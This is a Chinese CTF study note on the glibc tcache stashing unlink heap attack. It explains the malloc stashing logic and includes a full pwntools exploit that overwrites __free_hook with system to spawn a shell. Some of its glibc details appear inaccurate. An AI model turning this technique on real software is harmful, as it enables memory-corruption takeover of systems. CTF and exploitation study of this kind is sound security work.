---
title: tcache stashing unlink attack —— small bin 遍历 + tcache 链构造
category: pwn
tags: [tcache stashing unlink, small bin, unsorted bin, 任意地址分配, stashing]
signals: [small bin 里有两个以上同尺寸 chunk, tcache 对应 bin 没有满但可以控制空闲个数, 能通过 UAF 修改 small bin chunk 的 bk 指针, glibc 2.29 到 2.31 的题目, 目标是让 tcache 里出现一个指定地址, 需要往任意地址写一个堆地址或分配 chunk]
difficulty: hard
source: "how2heap tcache_stashing_unlink_attack.c / CTF-Wiki Tcache Attack"
tools: [pwntools, gdb, pwndbg, glibc-all-in-one]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- 题目能 free 出 **small bin** 级别的 chunk（`0x90 ~ 0x400`），并且 small bin 里**同时挂两个以上**同尺寸的 chunk。
- tcache 里对应大小的 bin **有空位**（数量 < 7）—— 这是 stashing 能否触发的前提。
- 有 UAF：free 之后还能 `edit` 修改 chunk 内容（改 `bk`）。
- 目标是「让 tcache 链里出现一个我们指定的地址」，进而下一次 `malloc` 返回它。
- libc 版本在 **2.29 ~ 2.31**（2.32+ 的 `bk` 有检查、`next` 有加密，成功率下降）。
- 题目里 `unsorted bin` / `small bin` 与 `tcache` 混合使用，`free` 顺序很讲究。
- 最终目标常见是 `__free_hook` / `__malloc_hook`，或 `.bss` 上伪造的 `_IO_FILE`。

## 二、原理

### 1. `tcache stashing` 是什么

`malloc` 在 small bin 命中时有一段预取逻辑：

```c
if (tcache != NULL && tc_idx < mp_.tcache_bins) {
    mchunkptr tc_victim;
    if (tcache->counts[tc_idx] < mp_.tcache_count) {      // tcache 未满
        victim = last(bin);                               // small bin 尾部
        while (tcache->counts[tc_idx] < mp_.tcache_count) {
            tc_victim = victim;
            victim = victim->bk;                          // ← 沿 bk 反向遍历
            if (tc_victim->bk == NULL || victim->bk != tc_victim) break;
            bck = tc_victim->bk;
            tcache_put(tc_victim, tc_idx);                // 塞进 tcache
        }
    }
}
```

关键点：遍历方向是 **`bk`**，每步校验 `victim->bk->fd == victim`；`2.29~2.31` 的 `tcache_put` 直接写指针，
所以**改掉某个 small bin chunk 的 `bk` 就能控制 tcache 链**。

### 2. 经典构造

目标：让 `malloc` 返回 `target`（`__free_hook - 0x10` 是最常见的落点）。

```
small bin[0x90] :  A <-> B          (B = last(bin)，即 bin->bk)
tcache[0x90]    :  X -> Y -> ...    (count = 6，差一个就满)
```

步骤：

1. **先泄漏 libc**：`free` 一个大 chunk（`0x500`）进 unsorted bin，用 `show` 读 `main_arena` 指针，得到 `__free_hook`。
2. **把 `0x90` 的 chunk 送进 small bin**：先用 7 个 `0x90` 把 `tcache[0x90]` 填满，再 `free(A)`、`free(B)` —— tcache 满了才回落到 unsorted bin。
3. **`malloc(0x500)`** 让 unsorted bin 排序，A、B 被归入 small bin。
4. **腾出 1 个 tcache 空位**：`malloc(0x88)` 从 tcache 拿一个（count 7 → 6）。
5. **UAF 改 `B->bk = target - 0x10`**。
6. **`malloc(0x88)`**：
   - tcache 未满且 small bin 非空 → 进入 stashing 分支；
   - 从 small bin 取块，`while (count < 7)` 沿 `bk` 反向遍历；
   - 走到被改写的 `B->bk`，把 `target` 也 `tcache_put` 进链。
7. 若干次 `malloc` 后 `target` 成为链头，`malloc` 返回它。

> **为什么是 `target - 0x10`**：`bk` 字段位于 chunk+0x18，而"该 chunk 的 user_ptr"是 chunk+0x10。目标要让 `*(target-0x10+0x18)` 恰好扮演 `bk`，同时 `*(target-0x10+0x10)` 扮演 `fd`。

### 3. 两条副作用（这本身就是"任意写"）

- `tcache_put(victim)`：`victim->next = entries[idx]; entries[idx] = victim;` —— 可对目标地址写一个堆指针。
- 遍历过程中的 `unlink_chunk`：会写 `bck->fd = victim`，处理得当时可对 `target` 附近**写两次**。

因此 stashing 同时给出 **任意地址分配** + **任意地址写堆指针** 两个原语。
### 4. `2.32+` 的变化

```c
/* tcache_put */
e->next = PROTECT_PTR(&e->next, tcache->entries[tc_idx]);   // 异或加密
e->key  = tcache;
```

- `next` 被 `(addr >> 12) ^ ptr` 加密，因此 **盲写不需要计算**（我们本来就不需要知道解密前的值），但需要泄漏才能精确控制。
- `2.34+` 对 `bk` 的检查更严（`bck->bk` 要归 `main_arena`），stashing 的成功率显著下降，通常需要更大范围的堆布局。

## 三、解题步骤

1. **先泄漏 libc**（`unsorted bin` 的 `main_arena` 指针），确定 `__free_hook` 等目标。
2. **布置 3 类 chunk**
```python
add(0x500)     # 0: 泄漏用大块，free 后进 unsorted bin
add(0x88)      # 1: A —— 最终进 small bin 的候选
add(0x88)      # 2: B —— 将会被 UAF 改写 bk
```
3. **填满 `tcache[0x90]`**：再 `malloc` 7 个 `0x88` 并全部 `free`，让 `counts[0x90] == 7`。
4. **把 A、B 推进 small bin**：`free(A); free(B);` 后 `malloc(0x500)` 触发 unsorted bin 排序，A、B 归入 small bin 链。
5. **腾出空位**：`malloc(0x88)` 两次，把 `counts[0x90]` 从 7 降到 5（要留 2 个空位：一个给 B，一个给假 chunk）。
6. **UAF 改 `B->bk`**：`edit(B, flat({0x18: target - 0x10}, length=0x90))`。
7. **一次 `malloc(0x88)`** 触发 stashing：`B` 进 tcache，`target` 也进 tcache 且位于链头。
8. **再一次 `malloc(0x88, payload)`** 直接返回 `target`，写入 `system`。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# tcache stashing unlink attack · glibc 2.29 ~ 2.31
# 目标：让 malloc 返回 __free_hook - 0x10，从而在 __free_hook 写 system
from pwn import *

context.binary = elf = ELF('./pwn')
libc = ELF('./libc-2.31.so')
context.log_level = 'info'

io = process(elf.path)

def add(size, data=b''):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    if data:
        io.sendafter(b'data: ', data)

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendafter(b'data: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'idx: ', str(idx).encode())

# ---------------- 1. 泄漏 libc ----------------
add(0x500)                      # 0: 大块，free 后进 unsorted bin 可直接泄漏
add(0x88)                       # 1: A（chunk size 0x90）
add(0x88)                       # 2: B（chunk size 0x90）
free(0)
show(0)
main_arena = u64(io.recv(6).ljust(8, b'\x00'))
libc_base  = main_arena - libc.sym['main_arena']
system     = libc_base + libc.sym['system']
free_hook  = libc_base + libc.sym['__free_hook']
log.success(f'libc = {hex(libc_base)}  free_hook = {hex(free_hook)}')

# ---------------- 2. 先把 tcache[0x90] 填满 ----------------
for _ in range(7):
    add(0x88)                   # 3 ~ 9
for i in range(3, 10):
    free(i)                     # tcache[0x90] count = 7（满）

# ---------------- 3. A、B 进 unsorted bin，再归入 small bin ----------------
free(1)                         # A : tcache 满 → unsorted bin
free(2)                         # B : 同上
add(0x500)                      # 10: 触发排序，A/B 归入 small bin（B 在链尾）

# ---------------- 4. 腾出 2 个 tcache 空位 ----------------
add(0x88)                       # 11: 取走 1 个，count = 6
add(0x88)                       # 12: 取走 1 个，count = 5（留出足够空位）

# ---------------- 5. UAF 改写 B->bk ----------------
# bk 位于 +0x18；让"假 chunk 的 user_ptr" == __free_hook
edit(2, flat({0x18: free_hook - 0x10}, length=0x90, filler=b'\x00'))

# ---------------- 6. 触发 stashing ----------------
add(0x88)                       # 13: 返回 B；stashing 把假 chunk 塞到链头
log.success('fake chunk stashed')

# ---------------- 7. 取出 __free_hook 并写入 system ----------------
add(0x88, p64(system) + p64(0)) # 14: 返回 假 chunk，user_ptr == __free_hook
log.success('__free_hook -> system')

# ---------------- 8. 触发 ----------------
add(0x88, b'/bin/sh\x00')       # 15
free(15)                        # __free_hook = system → system("/bin/sh")
io.interactive()
```

## 五、常见坑 / 变体

1. **tcache 必须未满**：`counts[tc_idx] < 7`，满了完全不触发 stashing 分支。
2. **`bk` 的检查**：遍历时 `victim->bk->fd == victim`，即 `*(target-0x10+0x10) = *(target) = victim`。所以 **target 处必须是可写地址**，且目标位置上原本的值会被改写（这就是副作用之一）。
3. **small bin 至少 2 个**：只有一个 chunk 时 `_int_malloc` 直接返回它，不走 stashing 循环。
4. **unsorted bin 非空**：chunk 必须先经 unsorted bin 排序才落 small bin；`free` 直接进 small bin 的路径会先过 tcache。
5. **`2.32+` 的 `next` 加密**：`tcache_put` 里 `e->next = PROTECT_PTR(&e->next, entries[idx])`，想精确控制链时要用 `addr >> 12` 还原。
6. **`2.34+` 的 `bk` 校验**：`unlink_chunk` 要求 `bck->bk` 属于 `main_arena`，需要构造更完整的双向链。
7. **顺序陷阱**：`free` 顺序决定落 bin，用 `gdb` 的 `bins` / `tcachebins` 逐步核对。
8. **变体**：`tcache stashing` + `unsorted bin` 得到 libc 泄漏（stashing 也能泄漏 `main_arena`）。

## 六、参考来源

- [how2heap: tcache_stashing_unlink_attack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_stashing_unlink_attack.c)
- [CTF-Wiki: Tcache Attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/)
- [ir0nstone: Binary Exploitation Notes](https://ir0nstone.gitbook.io/notes)
- [glibc 源码: malloc/malloc.c（_int_malloc stashing / tcache_put / PROTECT_PTR）](https://github.com/bminor/glibc/blob/master/malloc/malloc.c)
- [how2heap 仓库](https://github.com/shellphish/how2heap)
